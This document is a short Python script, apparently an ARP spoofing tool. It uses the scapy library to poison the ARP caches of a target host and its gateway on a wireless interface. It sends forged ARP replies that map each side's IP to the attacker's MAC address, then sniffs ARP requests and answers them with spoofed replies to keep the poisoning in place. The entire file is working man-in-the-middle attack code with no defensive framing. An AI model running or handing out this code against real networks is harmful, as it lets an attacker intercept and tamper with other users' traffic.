#-*-coding:utf-8-*-

from scapy.all import *
import sys



def attack_host():
	ether = Ether()
	ether.dst = host_mac 
	ether.src = attacker_mac  #attacker's mac

	arp = ARP()
	arp.psrc = gw_ip
	arp.hwsrc = attacker_mac
	arp.pdst = host
	arp.hwdst = host_mac
	arp.op = 2
	p = ether/arp
	for i in range(3):
		sendp(p)

def attack_gw():
	ether = Ether()
	ether.dst = gw_mac
	ether.src = attacker_mac

	arp = ARP()
	arp.psrc = host
	arp.hwsrc = attacker_mac
	arp.pdst = gw_ip
	arp.hwdst = gw_mac
	arp.op = 2
	p = ether/arp
	for i in range(3):
		sendp(p)

def sniff_spool_arp(pkt):
	a = ARP()
	a.pdst = pkt[ARP].psrc	
	a.hwsrc = attacker_mac  #attacker's mac
	a.psrc = pkt[ARP].pdst
	a.hwdst = pkt[ARP].hwsrc
	a.op = 2 #opcode为2表示响应
	for i in range(3):
		send(a)


if __name__ == '__main__':
	gw_ip = sys.argv[1]
	gw_mac = getmacbyip(gw_ip)	
	host = sys.argv[2]
	host_mac = getmacbyip(host)
	iface = 'wlan0'
	attacker_mac = get_if_hwaddr(iface)
	print attacker_mac

	attack_host()
	attack_gw()

	pkt_filter = "arp net "+host+" or arp net "+gw_ip
	pkt = sniff(iface="wlan0",filter=pkt_filter,prn=sniff_spool_arp,store=0)
